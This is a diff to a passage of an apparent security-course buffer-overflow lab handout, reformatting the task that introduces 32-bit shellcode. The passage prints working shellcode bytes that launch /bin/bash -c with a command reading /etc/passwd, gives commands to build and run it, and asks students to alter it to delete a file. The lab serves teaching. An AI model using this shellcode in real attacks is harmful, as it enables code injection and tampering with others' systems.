@@ -146,16 +146,17 @@ If you encounter problems when setting up the lab environment, please read the �
 ## 3 Task 1: Get Familiar with the Shellcode
 
 The ultimate goal of buffer-overflow attacks is to inject malicious code into the target program, so the code can be executed using the target program’s privilege. Shellcode is widely used in most code-injection attacks. Let us get familiar with it in this task.
-Shellcode is typically used in code injection attacks. It is basically a piece of code that launches a shell, and is usually written in assembly languages. In this lab, we only provide the binary version of a genericshellcode, without explaining how it works, because it is non-trivial. If you are interested in how exactly shellcode works, and want to write a shellcode from scratch, you can learn that from a separate SEED lab called Shellcode Lab. Our generic shellcode is listed in the following (we only list the 32-bit version):
+<Br>
+Shellcode is typically used in code injection attacks. It is basically a piece of code that launches a shell, and is usually written in assembly languages. In this lab, we only provide the binary version of a genericshellcode, without explaining how it works, because it is non-trivial. If you are interested in how exactly shellcode works, and want to write a shellcode from scratch, you can learn that from a separate SEED lab called *Shellcode Lab*. Our generic shellcode is listed in the following (we only list the 32-bit version):
 
 ```
 shellcode = (
 "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
 "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
 "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
-"/bin/bash*"
-"-c*" 
-"/bin/ls -l; echo Hello; /bin/tail -n 2 /etc/passwd *" 
+"/bin/bash*                                                      ➊
+"-c*"                                                            ➋
+"/bin/ls -l; echo Hello; /bin/tail -n 2 /etc/passwd *"           ➌
 # The * in this line serves as the position marker *
 "AAAA" # Placeholder for argv[0] --> "/bin/bash"
 "BBBB" # Placeholder for argv[1] --> "-c"
@@ -163,21 +164,22 @@ shellcode = (
 "DDDD" # Placeholder for argv[3] --> NULL
 ).encode(’latin-1’)
 ```
-The shellcode runs the "`/bin/bash`" shell program (Line 1 ), but it is given two arguments, "`-c`" (Line 2) and a command string (Line 3). This indicates that the shell program will run the commands in the second argument. The * at the end of these strings is only a placeholder, and it will be replaced by one byte of `0x00` during the execution of the shellcode. Each string needs to have a zero at the end, but we cannot put zeros in the shellcode. Instead, we put a placeholder at the end of each string, and then dynamically put
-a zero in the placeholder during the execution.
+The shellcode runs the "`/bin/bash`" shell program (Line ➊), but it is given two arguments, "`-c`" (Line ➋) and a command string (Line ➌). This indicates that the shell program will run the commands in the second argument. The * at the end of these strings is only a placeholder, and it will be replaced by one byte of `0x00` during the execution of the shellcode. Each string needs to have a zero at the end, but we cannot put zeros in the shellcode. Instead, we put a placeholder at the end of each string, and then dynamically put a zero in the placeholder during the execution.
+<Br>
 If we want the shellcode to run some other commands, we just need to modify the command string in Line 3. However, when making changes, we need to make sure not to change the length of this string, because the starting position of the placeholder for the `argv[]` array, which is right after the command string, is hardcoded in the binary portion of the shellcode. If we change the length, we need to modify the binary part. To keep the star at the end of this string at the same position, you can add or delete spaces.
+<Br>
 You can find the generic shellcode in the `shellcode` folder. Inside, you will see two Python pro-grams, `shellcode_32.py` and `shellcode_64.py`. They are for 32-bit and 64-bit shellcode, respectively. These two Python programs will write the binary shellcode to `codefile_32` and `codefile_64` , respectively. You can then use `call_shell_code` to execute the shellcode in them.
 ```
 // Generate the shellcode binary
-$ ./shellcode_32.py › generate codefile_32
-$ ./shellcode_64.py › generate codefile_64
+$ ./shellcode_32.py     --› generate codefile_32
+$ ./shellcode_64.py     --› generate codefile_64
 
 // Compile call_shellcode.c
-$ make › generate a32.out and a64.out
+$ make                  --› generate a32.out and a64.out
 
 // Test the shellcode
-$ a32.out › execute the shellcode in codefile_
-$ a64.out › execute the shellcode in codefile_
+$ a32.out               --› execute the shellcode in codefile_
+$ a64.out               --› execute the shellcode in codefile_
 ```
 **Task.** Please modify the shellcode, so you can use it to delete a file. Please include your modified the shellcode in the lab report, as well as your screenshots.
 
